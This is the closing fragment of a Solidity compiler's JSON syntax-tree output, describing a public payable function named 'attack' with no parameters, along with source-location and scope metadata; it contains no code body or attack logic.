									"functionSelector": "9e5faafc",
									"id": 35,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nameLocation": "265:6:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 18,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "271:2:0"
									},
									"returnParameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "289:0:0"
									},
									"scope": 36,
									"src": "256:131:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 37,
							"src": "66:323:0",
							"usedErrors": []
						}
					],
					"src": "32:357:0"
				},
				"id": 0
			}
		}
	}
}